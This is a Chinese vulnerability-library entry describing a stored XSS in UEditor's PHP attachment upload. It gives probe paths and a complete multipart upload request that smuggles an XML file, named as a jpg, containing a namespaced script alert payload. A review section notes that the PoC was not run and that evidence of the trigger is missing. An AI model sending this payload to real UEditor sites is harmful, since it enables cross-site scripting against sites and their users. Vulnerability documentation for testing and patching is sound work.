---
version: ""
source: "wy876 漏洞文库"
product: "UEditor / PHP附件XML"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "/ueditor/ueditor.all.js"
title: "ueditor存在XSS漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：无受影响版本；元数据version为ueditor.all.js路径"
side_effects: "未执行；本文需注意的操作影响：元数据更正：/ueditor/ueditor.all.js 是探测路径，不是版本号。XML 上传成功与浏览器同源访问/响应 Content-Type 才决定 XSS 是否触发；所贴 multipart 保留，但缺上传结果和触发响应，不能直接确认。"
source_status: "unknown"
id: "vw-8dbbe94cac9aeb32bcf3a993"
entity_id: "ve-8dbbe94cac9aeb32bcf3a993"
schema_version: "1"
---

## 核对与使用边界

- 元数据更正：/ueditor/ueditor.all.js 是探测路径，不是版本号。XML 上传成功与浏览器同源访问/响应 Content-Type 才决定 XSS 是否触发；所贴 multipart 保留，但缺上传结果和触发响应，不能直接确认。

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无受影响版本；元数据version为ueditor.all.js路径

代码与实验材料：完整multipart XML弹窗载荷，缺上传结果和浏览器触发响应

来源证据范围：语雀及wy876来源

- **事实待核（1）**：版本元数据误取检测路径；依据：/ueditor/ueditor.all.js不是版本号。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：缺执行上下文证据；依据：上传本身不能证明XSS，需访问URL、响应MIME/Disposition/CSP和同源关系。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：请求元字段与体不一致；依据：name为jpg、file为xml、size34和固定Length886需解释为捕获模板，避免直接复制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ueditor存在XSS漏洞

### 一、漏洞描述
ueditor存在XSS漏洞

### 二、影响版本


### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

首先点击上传附件，通过burp拦截，修改上传内容


```plain
POST /ueditor/php/controller.php?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Length: 886
X_Requested_With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHZorABX70DBbzax
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="name"

phphello.jpg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="type"

image/jpeg
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="lastModifiedDate"

Tue May 28 2024 11:33:15 GMT+0800 (香港标准时间)
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="size"

34
------WebKitFormBoundaryNHZorABX70DBbzax
Content-Disposition: form-data; name="upfile"; filename="phphello.xml"
Content-Type: image/jpeg

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
------WebKitFormBoundaryNHZorABX70DBbzax--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fn98g15xv4wqohvy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
